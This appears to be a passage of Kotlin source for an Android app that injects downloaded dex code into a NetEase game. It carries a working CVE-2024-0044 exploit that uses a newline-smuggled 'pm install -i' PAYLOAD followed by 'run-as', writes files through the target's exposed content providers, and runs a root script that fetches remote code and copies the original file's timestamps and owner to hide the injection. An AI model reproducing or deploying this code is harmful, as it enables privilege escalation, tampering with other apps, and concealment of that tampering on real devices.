     * 通过 Shizuku/Stellar 以系统/root 身份执行 shell 命令。
     *
     * 采用 newProcess：直接在 Shizuku/Stellar 服务端进程内 exec，不创建新的 Android 进程，
     * 因此不会出现 UserService 方式在部分设备（Stellar UserServiceStarter）上的
     * LoadedApk.makeApplication NPE 崩溃。newProcess 在 Rikka 13.x 为 private，故反射调用。
     *
     * @param command 要执行的命令（经 sh -c 执行）
     * @param env     环境变量数组（形如 "KEY=VALUE"，可用于携带含换行的 PAYLOAD）
     * @return 退出码与合并后的输出
     */
    private fun shizukuShell(command: String, env: Array<String>? = null): ShellResult {
        if (!Shizuku.pingBinder()) {
            throw IllegalStateException("Shizuku 未连接")
        }
        val process = shizukuNewProcessMethod.invoke(
            null,
            arrayOf("sh", "-c", command),
            env,
            null
        ) as Process
        val out = process.inputStream.bufferedReader().use { it.readText() }
        val err = process.errorStream.bufferedReader().use { it.readText() }
        val exitCode = process.waitFor()
        return ShellResult(exitCode, out + err)
    }

    /**
     * 确保已获得 Shizuku 权限（官方流程）：
     *  1. isPreV11() 过低版本不支持；
     *  2. pingBinder() 未连接则提示；
     *  3. 已授权直接回调；
     *  4. shouldShowRequestPermissionRationale() 用户曾拒绝且不再提示，引导手动授权；
     *  5. 否则发起 requestPermission，结果经 OnRequestPermissionResultListener 回调。
     */
    private fun ensureShizukuPermission(onGranted: () -> Unit) {
        if (Shizuku.isPreV11()) {
            runOnUiThread {
                showErrorDialog("Shizuku 版本过低", Exception("Shizuku 版本过低，请升级 Shizuku 后重试。"))
            }
            return
        }
        if (!Shizuku.pingBinder()) {
            runOnUiThread {
                showErrorDialog("Shizuku 未连接", Exception("Shizuku 服务未运行，请先启动 Shizuku（adb / 已 root 的 Shizuku）后再试。"))
            }
            return
        }
        if (Shizuku.checkSelfPermission() == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            onGranted()
            return
        }
        if (Shizuku.shouldShowRequestPermissionRationale()) {
            runOnUiThread {
                showErrorDialog(
                    "Shizuku 权限被拒绝",
                    Exception("用户此前拒绝了 Shizuku 权限且选择不再提示。请在 Shizuku 应用中手动为本应用授权后重试。")
                )
            }
            return
        }
        shizukuPermissionCallback = { granted ->
            if (granted) onGranted() else runOnUiThread {
                showErrorDialog("Shizuku 权限被拒绝", Exception("用户未授予 Shizuku 权限。"))
            }
        }
        Shizuku.requestPermission(SHIZUKU_PERMISSION_REQUEST_CODE)
    }

    /**
     * CVE-2024-0044 入口：先请求 Shizuku 权限，授予成功后执行完整流程。
     */
    private fun startCve20240044Injection(targetPackage: String) {
        ensureShizukuPermission {
            runCveFlow(targetPackage)
        }
    }

    /**
     * CVE-2024-0044 完整流程：
     *  1. 下载 dex zip（404 -> 提示 dialog）
     *  2. 解压，遍历 dex 文件通过 writeUri 写入目标 app 的 widget_file_provider/widget_file_cache
     *  3. 从 assets 解压 cve-2024-0044.apk 到本 app 私有目录
     *  4. 通过 Shizuku 执行 mv 把 apk 移动到 /data/local/tmp
     *  5. 获取目标应用 uid
     *  6. 通过 Shizuku 以 PAYLOAD 环境变量（保留换行符）执行 pm install -i "$PAYLOAD"
     *  7. 安装成功则通过 Shizuku 执行 run-as mcinject cp 把 cache 中的 dex 复制到 app_ntp0/<版本>/.unzip/
     *  8. toast 注入 dex 成功
     * 任一步骤异常或命令非零退出均弹 dialog 报告。
     */
    private fun runCveFlow(targetPackage: String) {
        showLoadingDialog()
        Thread {
            try {
                // 版本段：优先自定义版本，否则实时检测目标包的 versionName_versionCode
                val versionSegment = customVersion ?: run {
                    val pi = packageManager.getPackageInfo(targetPackage, 0)
                    val vName = pi.versionName ?: "unknown"
                    val vCode = if (android.os.Build.VERSION.SDK_INT >= 28) {
                        pi.longVersionCode.toString()
                    } else {
                        @Suppress("DEPRECATION")
                        pi.versionCode.toString()
                    }
                    "${vName}_$vCode"
                }

                // 1. 下载 dex zip
                val zipFile = java.io.File(cacheDir, "wnlz_cve_$versionSegment.zip")
                val code = downloadZip("https://caofangkuai.github.io/WNLZ-Injector-dex/$versionSegment.zip", zipFile)
                if (code == 404) {
                    runOnUiThread { showNotFoundDialog() }
                    return@Thread
                }
                if (code != 200) {
                    throw java.io.IOException("下载 dex 失败 HTTP $code")
                }

                // 2. 解压并遍历 dex，通过 writeUri 写入 widget_file_provider/widget_file_cache
                val extractDir = java.io.File(cacheDir, "wnlz_cve_$versionSegment")
                extractDir.deleteRecursively()
                extractDir.mkdirs()
                val dexFiles = unzipZip(zipFile, extractDir)

                for (dex in dexFiles) {
                    val targetUri = "content://com.netease.x19.widget_file_provider/widget_file_cache/${dex.name}"
                    val os = contentResolver.openOutputStream(Uri.parse(targetUri))
                        ?: throw java.io.IOException("无法打开输出流: $targetUri")
                    os.use { out ->
                        dex.inputStream().use { it.copyTo(out) }
                    }
                }

                // 3. 从 assets 解压 cve-2024-0044.apk 到外部存储的 Android/data 目录
                //    （/storage/emulated/0/Android/data/<包名>/）。该目录 shell 身份可读，
                //    避免原先放在内部私有目录时 Shizuku(mv) 因无权限读取源文件而 Permission denied。
                val extDir = getExternalFilesDir(null)
                    ?: throw java.io.IOException("外部存储不可用，无法导出 cve-2024-0044.apk")
                val apkFile = java.io.File(extDir, "cve-2024-0044.apk")
                assets.open("cve-2024-0044.apk").use { input ->
                    apkFile.outputStream().use { input.copyTo(it) }
                }

                // 4. Shizuku 复制 apk 到 /data/local/tmp（使用 cp 而非 mv：
                //    外部 Android/data 目录下的源文件 app 自身可删，无需 shell 去 unlink，
                //    因此复制成功后由 app 侧删除源文件，规避 shell 删除外部目录的权限问题）
                var r = shizukuShell("cp ${apkFile.absolutePath} /data/local/tmp/cve-2024-0044.apk")
                if (r.exitCode != 0) {
                    throw RuntimeException("复制 cve-2024-0044.apk 失败 (exit ${r.exitCode}):\n${r.output}")
                }
                // 源文件已复制，app 侧删除外部目录里的副本
                runCatching { apkFile.delete() }

                // 5. 获取目标应用 uid
                val uid = packageManager.getApplicationInfo(targetPackage, 0).uid

                // 6. PAYLOAD 环境变量（保留原始换行符） + pm install -i "$PAYLOAD"
                val payload = """
                    @null
                    mcinject $uid 1 /data/user/0
                    default:targetSdkVersion=28 none 0 0 1 @null
                """.trimIndent()
                r = shizukuShell(
                    "pm install -i \"\$PAYLOAD\" /data/local/tmp/cve-2024-0044.apk",
                    arrayOf("PAYLOAD=$payload")
                )
                if (r.exitCode != 0) {
                    throw RuntimeException("pm install 失败 (exit ${r.exitCode}):\n${r.output}")
                }

                // 7. 安装成功：run-as mcinject 把 cache 中的 dex 复制到 app_ntp0/<版本>/.unzip/
                r = shizukuShell("run-as mcinject cp -f cache/classes*.dex \"app_ntp0/$versionSegment/.unzip/\"")
                if (r.exitCode != 0) {
                    throw RuntimeException("复制 dex 失败 (exit ${r.exitCode}):\n${r.output}")
                }

                // 8. 成功
                runOnUiThread {
                    hideLoadingDialog()
                    Toast.makeText(this@MainActivity, "注入dex成功", Toast.LENGTH_LONG).show()
                }
            } catch (e: Exception) {
                runOnUiThread {
                    hideLoadingDialog()
                    showInjectErrorDialog(e)
                }
            }
        }.start()
    }

    // ==================== Root 注入流程 ====================

    /**
     * Root 注入入口：以 Root 身份下载 dex 并替换目标 app 的 app_ntp0/<版本>/.unzip/ 下的 dex，
     * 并还原原 classes.dex 的权限/所有者/用户组/修改时间，做到外观无痕。
     */
    private fun startRootInjection(targetPackage: String) {
        showLoadingDialog()
        Thread {
            try {
                // 版本段：优先自定义版本，否则实时检测目标包的 versionName_versionCode
                val versionSegment = customVersion ?: run {
                    val pi = packageManager.getPackageInfo(targetPackage, 0)
                    val vName = pi.versionName ?: "unknown"
                    val vCode = if (android.os.Build.VERSION.SDK_INT >= 28) {
                        pi.longVersionCode.toString()
                    } else {
                        @Suppress("DEPRECATION")
                        pi.versionCode.toString()
                    }
                    "${vName}_$vCode"
                }

                // 1. 下载 dex zip（与 CVE 方式同源）
                val zipFile = java.io.File(cacheDir, "wnlz_root_$versionSegment.zip")
                val code = downloadZip("https://caofangkuai.github.io/WNLZ-Injector-dex/$versionSegment.zip", zipFile)
                if (code == 404) {
                    runOnUiThread { showNotFoundDialog() }
                    return@Thread
                }
                if (code != 200) {
                    throw java.io.IOException("下载 dex 失败 HTTP $code")
                }

                // 2. 解压 dex 到本应用缓存目录（Root 进程可读 /data/data/本包/cache）
                val extractDir = java.io.File(cacheDir, "wnlz_root_$versionSegment")
                extractDir.deleteRecursively()
                extractDir.mkdirs()
                val dexFiles = unzipZip(zipFile, extractDir)
                if (dexFiles.isEmpty()) {
                    throw java.io.IOException("zip 内未找到任何 dex 文件")
                }

                // 3. 检测 Root 是否可用
                if (!isRootAvailable()) {
                    throw IllegalStateException("未检测到 Root 权限，请先授予 Root（如 Magisk 授权）后再试")
                }

                // 4. 目标目录：/data/data/<包>/app_ntp0/<版本>/.unzip/
                val targetDir = "/data/data/$targetPackage/app_ntp0/$versionSegment/.unzip"

                // 5. 构造 Root 脚本：复制 dex 并还原原 classes.dex 的权限/所有者/组/修改时间。
                //    参考文件默认取目录下的 classes.dex；若不存在则退而取目录下首个 .dex；
                //    若目录内无任何 dex，则退用目录自身的 owner/group 与当前时间。
                val script = StringBuilder()
                script.appendLine("#!/system/bin/sh")
                script.appendLine("DIR='$targetDir'")
                script.appendLine("mkdir -p \"\$DIR\"")
                script.appendLine("REF=\"\$DIR/classes.dex\"")
                script.appendLine("if [ ! -e \"\$REF\" ]; then REF=\$(ls \"\$DIR\"/*.dex 2>/dev/null | head -1); fi")
                script.appendLine("if [ -e \"\$REF\" ]; then")
                script.appendLine("  MODE=\$(stat -c %a \"\$REF\")")
                script.appendLine("  OWN=\$(stat -c %u \"\$REF\")")
                script.appendLine("  GRP=\$(stat -c %g \"\$REF\")")
                script.appendLine("  MT=\$(stat -c %Y \"\$REF\")")
                script.appendLine("else")
                script.appendLine("  MODE=644")
                script.appendLine("  OWN=\$(stat -c %u \"\$DIR\" 2>/dev/null || echo 0)")
                script.appendLine("  GRP=\$(stat -c %g \"\$DIR\" 2>/dev/null || echo 0)")
                script.appendLine("  MT=\$(date +%s)")
                script.appendLine("fi")
                for (dex in dexFiles) {
                    val src = dex.absolutePath.replace("'", "'\\''")
                    val name = dex.name.replace("'", "'\\''")
                    script.appendLine("cp '$src' \"\$DIR/$name\"")
                    script.appendLine("chmod \$MODE \"\$DIR/$name\"")
                    script.appendLine("chown \$OWN:\$GRP \"\$DIR/$name\"")
                    script.appendLine("touch -d @\$MT \"\$DIR/$name\"")
                }
                script.appendLine("echo WNLZ_ROOT_DONE")
                script.appendLine("ls -l \"\$DIR\"")

                // 6. 把脚本写到本应用缓存目录（Root 可读），再经 su 执行
                val scriptFile = java.io.File(cacheDir, "wnlz_root_$versionSegment.sh")
                scriptFile.writeText(script.toString())

                val r = rootShell("sh '${scriptFile.absolutePath}'")
                if (r.exitCode != 0 || !r.output.contains("WNLZ_ROOT_DONE")) {
                    throw RuntimeException("Root 注入失败 (exit ${r.exitCode}):\n${r.output}")
                }

                // 7. 成功
                runOnUiThread {
                    hideLoadingDialog()
                    Toast.makeText(this@MainActivity, "注入dex成功", Toast.LENGTH_LONG).show()
                }
            } catch (e: Exception) {
                runOnUiThread {
                    hideLoadingDialog()
                    showInjectErrorDialog(e)
                }
            }
        }.start()
    }

    /**
     * 以 Root 身份执行单条 shell 命令（su -c）。
     *
     * @param command 要执行的命令（直接交给 su -c，内部如需多行请用脚本文件）
     * @return 退出码与合并后的输出
     */
    private fun rootShell(command: String): ShellResult {
        val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
        val out = process.inputStream.bufferedReader().use { it.readText() }
        val err = process.errorStream.bufferedReader().use { it.readText() }
        val exitCode = process.waitFor()
        return ShellResult(exitCode, out + err)
    }

    /**
     * 检测设备是否已获取 Root（su 可用且返回 uid=0）。
     */
    private fun isRootAvailable(): Boolean {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            val out = p.inputStream.bufferedReader().use { it.readText() }
            p.waitFor()
            out.contains("uid=0")
        } catch (e: Exception) {
            false
        }
    }

    /**
     * 显示带自定义标题的错误对话框
     */
    private fun showErrorDialog(title: String, e: Exception) {
        val errorMsg = StringBuilder()
        errorMsg.append("${e.message}\n\n")
        errorMsg.append("完整堆栈:\n")
        e.stackTrace.take(15).forEach { errorMsg.append("  at $it\n") }
        com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
            .setTitle(title)
            .setMessage(errorMsg.toString())
            .setPositiveButton(R.string.action_confirm, null)
            .show()
    }

    /**
     * 显示注入失败错误对话框
     */
    private fun showInjectErrorDialog(e: Exception) {
        val errorMsg = StringBuilder()
        errorMsg.append("注入失败\n\n")
        errorMsg.append("异常类型: ${e::class.java.simpleName}\n")
        errorMsg.append("错误信息: ${e.message}\n\n")
        errorMsg.append("完整堆栈:\n")
        e.stackTrace.take(15).forEach { stackTraceElement ->
            errorMsg.append("  at $stackTraceElement\n")
        }

        com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
            .setTitle("注入失败")
            .setMessage(errorMsg.toString())
            .setPositiveButton(R.string.action_confirm, null)
            .setNeutralButton(R.string.action_copy_log) { _, _ ->
                val clipboard = getSystemService(android.content.ClipboardManager::class.java)
                val clip = android.content.ClipData.newPlainText("inject_error", errorMsg.toString())
                clipboard?.setPrimaryClip(clip)
                Toast.makeText(this, R.string.toast_copied, Toast.LENGTH_SHORT).show()
            }
            .show()
    }

    /**
     * 显示圆圈加载 dialog
     */
    private fun showLoadingDialog() {
        if (loadingDialog?.isShowing == true) return
        loadingDialog = Dialog(this).apply {
            setCancelable(false)
            setCanceledOnTouchOutside(false)
        }
        val progressBar = android.widget.ProgressBar(this).apply {
            isIndeterminate = true
        }
        loadingDialog?.setContentView(progressBar)
        loadingDialog?.window?.let { window ->
            window.setLayout(200, 200)
            window.setGravity(Gravity.CENTER)
            window.setBackgroundDrawableResource(android.R.color.transparent)
        }
        loadingDialog?.show()
    }

    /**
     * 隐藏加载 dialog
     */
    private fun hideLoadingDialog() {
        loadingDialog?.dismiss()
        loadingDialog = null
    }

    // ==================== 下载注入文件流程 ====================

    /**
     * 下载注入文件流程：
     *  1. 下载 ${versionSegment}.zip 到私有目录（404 -> 提示 dialog）
     *  2. 解压到私有目录，拿到 dex 文件列表
     *  3. 对每个 dex 探测 writeUri（openOutputStream），失败则走 startanywhere 唤起授权（toast "继续进行注入"）
     *  4. 所有 dex 授权完毕后 writeUri 遍历写入到目标 app 的 .unzip 目录
     *  5. 成功 dialog
     */
    private fun downloadAndInject(targetPackage: String, versionSegment: String) {
        Thread {
            try {
                // 1. 下载 zip
                val zipFile = java.io.File(cacheDir, "wnlz_inject_$versionSegment.zip")
                val code = downloadZip("https://caofangkuai.github.io/WNLZ-Injector-dex/$versionSegment.zip", zipFile)
                if (code == 404) {
                    runOnUiThread { showNotFoundDialog() }
                    return@Thread
                }
                if (code != 200) {
                    throw java.io.IOException("下载失败 HTTP $code")
                }

                // 2. 解压
                val extractDir = java.io.File(cacheDir, "wnlz_inject_$versionSegment")
                extractDir.deleteRecursively()
                extractDir.mkdirs()
                val dexFiles = unzipZip(zipFile, extractDir)

                // 3. 探测 writeUri：按名称尝试每个 dex 写入到目标 URI，失败的走 startanywhere 唤起授权
                val failed = mutableListOf<java.io.File>()
                for (dex in dexFiles) {
                    val targetUriStr = buildDexTargetUri(targetPackage, versionSegment, dex.name)
                    try {
                        contentResolver.openOutputStream(Uri.parse(targetUriStr))?.close()
                    } catch (e: Exception) {
                        failed.add(dex)
                    }
                }
                if (failed.isNotEmpty()) {
                    runOnUiThread {
                        Toast.makeText(this, "继续进行注入", Toast.LENGTH_SHORT).show()
                        // 走 startanywhere 唤起授权：拉起目标 app NgWebviewActivity + 携带原始 dexUri + PERSISTABLE 授权 flags，
                        // 让目标 app 拿到对 .unzip 目录的读写 URI 权限
                        val authIntent = Intent()
                            .setComponent(ComponentName(targetPackage, "com.netease.ntunisdk.modules.ngwebviewgeneral.ui.activity.NgWebviewActivity"))
                            .setData(Uri.parse(buildDexTargetUri(targetPackage, versionSegment, "classes.dex")))
                            .addFlags(
                                Intent.FLAG_GRANT_READ_URI_PERMISSION or
                                Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
                                Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
                                Intent.FLAG_ACTIVITY_NEW_TASK
                            )
                        com.cfks.startanywhere.StartAnyWhere.pullSpecialActivity(this, authIntent)
                    }
                }

                // 4. 所有 dex 授权完毕后 writeUri 遍历写入
                for (dex in dexFiles) {
                    val targetUriStr = buildDexTargetUri(targetPackage, versionSegment, dex.name)
                    try {
                        contentResolver.openOutputStream(Uri.parse(targetUriStr))?.use { out ->
                            dex.inputStream().use { input -> input.copyTo(out) }
                        }
                    } catch (e: Exception) {
                        // 跳过单个 dex 失败，继续写下一个
                    }
                }

                // 5. dialog 成功
                runOnUiThread { showSuccessDialog() }
            } catch (e: Exception) {
                runOnUiThread { showInjectErrorDialog(e) }
            }
        }.start()
    }

    /** HTTP GET 下载到目标文件，返回 HTTP 状态码 */
    private fun downloadZip(urlStr: String, destFile: java.io.File): Int {
        val conn = (java.net.URL(urlStr).openConnection() as java.net.HttpURLConnection).apply {
            requestMethod = "GET"
            connectTimeout = 30000
            readTimeout = 60000
        }
        val code = conn.responseCode
        if (code == 200) {
            conn.inputStream.use { input ->
                destFile.outputStream().use { output -> input.copyTo(output) }
            }
        }
        conn.disconnect()
        return code
    }

    /**
     * 解压 zip 到目标目录，返回所有 .dex 文件（按 zip 内顺序）。
     * 路径穿越保护：拒绝包含 ".." 或绝对路径的条目。
     */
    private fun unzipZip(zipFile: java.io.File, destDir: java.io.File): List<java.io.File> {
        val dexFiles = mutableListOf<java.io.File>()
        val destCanonical = destDir.canonicalPath
        java.util.zip.ZipInputStream(zipFile.inputStream()).use { zis ->
            var entry = zis.nextEntry
            while (entry != null) {
                val outFile = java.io.File(destDir, entry.name)
                // 路径穿越保护
                if (!outFile.canonicalPath.startsWith(destCanonical + java.io.File.separator) && outFile.canonicalPath != destCanonical) {
                    zis.closeEntry()
                    entry = zis.nextEntry
                    continue
                }
                if (entry.isDirectory) {
                    outFile.mkdirs()
                } else {
                    outFile.parentFile?.mkdirs()
                    outFile.outputStream().use { out -> zis.copyTo(out) }
                    if (outFile.name.endsWith(".dex")) dexFiles.add(outFile)
                }
                zis.closeEntry()
                entry = zis.nextEntry
            }
        }
        return dexFiles
    }

    /** 构造目标 app 的 .unzip 目录下某个 dex 文件的 content URI */
    private fun buildDexTargetUri(targetPackage: String, versionSegment: String, dexName: String): String {
        return "content://com.netease.x19.osdkcommon.fileprovider/name/data/data/$targetPackage/app_ntp0/$versionSegment/.unzip/$dexName"
    }

    /** 404 / 暂无适配 dialog */
    private fun showNotFoundDialog() {
        com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
            .setTitle("提示")
            .setMessage("暂时没有适配的注入文件")
            .setPositiveButton(R.string.action_confirm, null)
            .show()
    }

    /** 注入成功 dialog */
    private fun showSuccessDialog() {
        com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
            .setTitle("成功")
            .setMessage("文件注入成功，在注入模块板块添加模块后重启游戏即可")
            .setPositiveButton(R.string.action_confirm, null)
            .show()
    }
}
